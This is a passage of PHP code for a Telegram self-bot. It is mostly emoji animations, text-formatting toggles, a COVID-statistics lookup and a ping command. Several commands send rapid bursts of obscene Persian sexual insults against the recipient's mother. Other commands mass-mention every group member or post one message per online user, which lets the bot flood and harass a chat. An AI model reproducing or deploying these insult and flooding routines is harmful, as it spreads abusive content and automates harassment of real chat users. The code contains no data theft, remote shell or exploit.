                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '☘️🍁☘️🍁☘️🍁☘️🍁☘️🍁☘️🍁☘️🍁☘️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍂🍁🌱🌿🍂🍁🌱🌿🍂🍁🌱🌿🍂🍁🌱🌿']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍃🍂🍁🌱🌿☘️🍀🍃🍁🍂🌿🌱☘️🍀🍃']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'دیگه برگی برام نمونده ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'پشمام ریخ ☹']);
                    }

                    if ($boldmode == "on") {
                        if ($update) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "<b>$text</b>", 'parse_mode' => 'HTML']);


                        }
                    }
                    if ($mentionmode == "on") {
                        if ($update) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "<a href='tg://user?id=$from_id'>$text</a>", 'parse_mode' => 'HTML']);


                        }
                    }
                    if ($codingmode == "on") {
                        if ($update) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "<code>$text</code>", 'parse_mode' => 'HTML']);


                        }
                    }
                    if ($strikethrough == "on") {
                        if ($update) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "<del>$text</del>", 'parse_mode' => 'HTML']);


                        }
                    }
                    if ($undermode == "on") {
                        if ($update) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "<u>$text</u>", 'parse_mode' => 'HTML']);


                        }
                    }
                    if ($italic == "on") {
                        if ($update) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "<I>$text</I>", 'parse_mode' => 'HTML']);

                        }
                    }
                    if ($hashtagmode == "on") {
                        if ($update) {
                            $tag = "#" . $text;
                            $tags = str_replace(' ', "_", $tag);
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => $tags]);

                        }
                    }
                    if ($partmode == "on") {
                        if ($update) {
                            if (strlen($text) < 150) {
                                $text = str_replace(" ", "‌", $text);
                                for ($T = 1; $T <= mb_strlen($text); $T++) {
                                    yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => mb_substr($text, 0, $T)]);
                                    yield $this->sleep(0.1);
                                }
                            }
                        }
                    }
                    if ($text == 'شمارش2' or $text == '0') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '11']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '12']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '13']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '14']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '15']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '16']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '17']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '18']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '19']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '20']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'صیکتیر شمارش خوردی کص ننت با میمنت']);
                    }

                    if ($text == 'کصننت' or $text == 'ksnne') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'کـــ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کــص']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کــص ن']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کـــص نـــنـ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کـــص نـنـتـ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💝کص نـنـت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '☘کـــص نـنـت دیگه☘']);
                    }
                    /*===============شمارش ساده===============*/
                    if ($text == 'شمارش') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1⃣1⃣
1⃣1⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '2⃣2⃣
2⃣2⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '3⃣3⃣
3⃣3⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '4⃣4⃣
4⃣4⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '5⃣5⃣
5⃣5⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '6⃣6⃣
6⃣6⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '7⃣7⃣
7⃣7⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '8⃣8⃣
8⃣8⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '9⃣9⃣
9⃣9⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🔟🔟
🔟🔟']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1⃣1⃣
1⃣1⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1⃣2⃣
1⃣2⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1⃣3⃣
1⃣3⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1⃣4⃣
1⃣4⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1⃣5⃣
1⃣5⃣']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '☘|‌صیکتیر شمارش خوردی|☘']);
                    } else if (preg_match("/^[\/\#\!]?(آمار کرونا) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(آمار کرونا) (.*)$/i", $text, $p);
                        $cron = $p[2];
                        $linkcrona = json_decode(file_get_contents("https://api.codebazan.ir/corona/?type=country&country=$cron"), true);
                        $link22 = $linkcrona["result"];
                        $crona1 = $link22['last_updated'];
                        $crona2 = $link22['continent'];
                        $crona3 = $link22['country'];
                        $crona4 = $link22['cases'];
                        $crona5 = $link22['deaths'];
                        $crona6 = $link22['recovered'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => " 
آخرین بروزرسانی♻️:
$crona1
قاره🔷: 
$crona2 
کشور🚩: 
$crona3 
امار مبتلایان⚠️: 
$crona4 
امار مرگ و میر🔴: 
$crona5 
امار بهبود یافته🟢 : 
$crona6 
        "]);
                    } elseif (preg_match("/^[\/\#\!]?(selfping)$/i", $text)) {
                        $domain = 'tcp://149.154.167.51';
                        $port = 443;
                        $starttime = microtime(true);
                        $file = fsockopen($domain, $port, $s, $s, 1);
                        $stoptime = microtime(true);
                        fclose($file);
                        $ping = floor(($stoptime - $starttime) * 1000);
                        yield $this->messages->editMessage([
                            'peer' => $peer,
                            'id' => $msg_id,
                            'message' => "Ping: " . $ping . 'ms'
                        ]);
                    }
                    if (preg_match("/^[\/\#\!]?(tagall)(.*)$/i", $text)) {
                        $chat = yield $this->getPwrChat($peer);
                        $chats = $chat['participants'];
                        while (sizeof($chats) >= 100) {
                            $spl = $chats;
                            $Safa = false;
                            $chats = array_splice($spl, 100);
                            foreach ($spl as $number => $up) {
                                $id = $up['user']['id'];
                                $Safa .= $number + 1 . "-[$id](tg://user?id=$id) ";
                            }
                            yield $this->messages->sendMessage([
                                'peer' => $peer,
                                'message' => "𝗔𝗹𝗹 𝗨𝘀𝗲𝗿𝘀 𝗜𝗻 𝗚𝗥𝗢𝗨𝗣 :\n$Safa",
                                'parse_mode' => 'Markdown'
                            ]);
                        }
                        $Safa = false;
                        foreach ($chats as $number => $up) {
                            $id = $up['user']['id'];
                            if ($up['user']['type'] == "user")
                                $Safa .= $number + 1 . "-[$id](tg://user?id=$id) ";
                        }
                        yield $this->messages->sendMessage([
                            'peer' => $peer,
                            'message' => "𝗔𝗹𝗹 𝗨𝘀𝗲𝗿𝘀 𝗜𝗻 𝗚𝗥𝗢𝗨𝗣 :\n$Safa",
                            'parse_mode' => 'Markdown'
                        ]);
                        return;
                    }

                    if ($text == 'تگ انلاین' or $text == "tagonline") {
                        $lis = [];
                        $ChatOnlines = $this->messages->getOnlines(['peer' => $peer,]);
                        foreach ($ChatOnlines['participants'] as $ajbs) {
                            if (isset($ajbs['user']['username']))
                                $lis[] = $ajbs['user']['username'];
                        }
                        foreach ($lis as $reza) {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$reza \n"]);
                        }
                    }
                    if ($text == 'قلبز' or $text == 'qlb2') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '💚💛🧡❤️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💙💚💜🖤']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤️🤍🧡💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖤💜💙💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🤍🤎❤️💙']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖤💜💚💙']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💝💘💗💘']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤️🤍🤎🧡']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💕💞💓🤍']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💜💙❤️🤍']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💙💜💙💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧡💚🧡💙']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💝💜💙❤️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💞🖤💙💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛🧡❤️💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '☘💙I LOVE YOU💙☘']);
                    }
                    if ($text == 'موک' or $text == 'moc') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🟪🟩🟨⬛️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟨🟩🟦']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟦🟥🟩']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬛️⬜️🟪']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟨🟦🟪🟩']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬛️🟪🟦']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟩🟫🟨']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🔳🔲◻️🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '▪️▫️◽️◼️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '◻️◼️◽️▪️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟦🟨🟪']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬛️🟪🟩']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟨🟥🟦']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟩🟦🟩🟪']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🔳🔲🟪🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '☘تـــــامــــام☘']);
                    }
                    if ($text == 'خودم' or $text == 'khodam') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '   
   *／ イ  *   　　　((( ヽ*♤
​(　 ﾉ　　　　 ￣Ｙ＼​
​| (＼　(\🎩/)   ｜    )​♤
​ヽ　ヽ` ( ͡° ͜ʖ ͡°) _ノ    /​ ♤
　​＼ |　⌒Ｙ⌒　/  /​♤
　​｜ヽ　 ｜　 ﾉ ／​♤
　 ​＼トー仝ーイ​♤
　　 ​｜ ミ土彡 |​♤
         ​) \      °     /​♤
         ​(     \       /​l♤
         ​/       /   \ \  \
      ​/  /     /      \ \   \​ 
      ​( (    ).           ) ).  )​♤
     ​(      ).            ( |    |​ 
      ​|    /                \    |​♤
         ☆͍ 。͍✬͍​͍。͍☆͍​͍​͍
 ͍​͍ ​͍​͍☆͍。͍＼͍｜͍／͍。͍ ☆͍ ​͍✬͍​͍ ☆͍​͍​͍​͍
​͍ ͍​͍  *͍                         *
 ͍ ​͍​͍​͍☆͍。͍／͍｜͍＼͍。͍ ☆͍ ​͍✬͍​͍☆͍​͍​͍​͍
​͍​͍​͍。͍☆͍ 。͍✬͍​͍。͍☆͍​͍​͍​͍']);
                    }
                    if ($text == 'لفت' or $text == 'left') {
                        yield $this->channels->leaveChannel(['channel' => $peer]);
// yield $MadelineProto->channels->deleteChannel(['channel' => $peer ]);
                    }
                    if ($text == 'کوصه' or $text == 'کوصه بشم') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "１"]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "وقتشه کوسه بشم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "تو دریای بی کران ننت شنا کنم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ننتو به دندون بگیرم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "مرده کونی", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "کیرم تو مادرت", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ننه ماهی", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ننت بگام", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "وقتشه غیرتت بگیرم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ننت دهنم خوار کونی", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "تف تو کص مادرت", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "کص ننت گاز بگیرم", 'id' => $msg_id + 1]);
                    }
                    if ($text == 'کصمادرت' or $text == 'ننشو بکن') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "１"]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "کص ننت بالا باش", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "برا بابات شاخ نشو بیناموص", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "بدبخت چموش یتیم زاده مادرتو گاییدم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "مادرتو میکشم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ابلح زاده خر ناموس", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "بگو گوه خوردم برای پدرم شاخ شدم", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "اشعه های فرابنفش", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "تو کص خوارت", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "مادرت کص شد", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "کیر به کص ننت با موفقیت گذاشته شد", 'id' => $msg_id + 1]);
                    }
                    /*================سرگرمی اینجکتور=============*/
                    if ($text == 'خایمالو سگ بگاد' or $text == 'خایمال') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂                 • 🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂                •  🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂               •   🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂              •    🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂             •     🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂            •      🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂           •       🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂          •        🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂         •         🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂        •          🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂       •           🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂      •            🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂     •             🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂    •              🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂   •               🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂  •                🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂 •                 🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂•                  🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤯                  🔫 🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "خایمال شناسایی شد و کشته شد :)"]);
                    }
                    if ($text == 'آدم فضایی') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽                     🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽                    🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽                   🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽                  🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽                 🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽                🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽               🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽              🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽             🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽            🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽           🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽          🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽         🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽        🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽       🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽      🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽     🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽    🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽   🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽  🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽 🔦😼"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👽🔦🙀"]);
                    }
                    if ($text == 'موشک' or $text == 'حمله' or $text == 'سفینه بترکون') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                                🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                               🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                              🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                             🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                            🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                           🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                          🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                         🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                        🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                       🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                      🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                     🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                   🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                  🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                 🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀                🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀               🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀              🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀            🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀           🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀          🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀         🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀        🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀       🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀      🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀     🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀    🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀   🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀  🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀 🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍🚀🛸"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌍💥Boom💥"]);
                    }
                    if ($text == 'پول' or $text == 'دلار' or $text == 'ارباب شهر من') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌                    💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌                   💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌                 💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌                💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌               💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌              💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌             💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌            💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌           💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌          💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥                     💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌        💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌       💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌      💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌     💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌    💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌   💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌  💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌ 💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥           💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥          💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥         💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥        💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥       💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥      💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥     💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥    💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥   💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥  💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥 💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💸"]);
                    }
